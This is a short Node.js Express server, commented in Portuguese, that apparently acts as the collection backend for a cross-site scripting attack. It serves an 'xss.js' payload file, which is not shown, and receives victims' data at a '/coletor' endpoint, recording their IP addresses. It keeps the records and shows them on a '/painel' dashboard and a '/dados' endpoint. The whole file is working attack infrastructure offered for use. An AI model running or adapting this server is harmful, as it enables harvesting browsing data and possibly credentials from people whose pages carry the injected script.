const express = require('express');
const fs = require('fs');
const path = require('path');
const app = express();
const PORT = 3000;

let registros = [];

app.use(express.json());

app.post('/coletor', (req, res) => {
  const log = req.body;
  log._ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
  registros.push(log);
  console.log(`[+] Coleta recebida de ${log._ip} - ${log.url}`);
  res.sendStatus(200);
});

app.get('/painel', (req, res) => {
  res.sendFile(path.join(__dirname, 'painel.html'));
});

app.get('/dados', (req, res) => {
  res.json(registros);
});

app.use('/xss.js', express.static(path.join(__dirname, 'xss.js')));

app.listen(PORT, () => {
  console.log(`🛰️  Painel XSS ativo: http://localhost:${PORT}/painel`);
});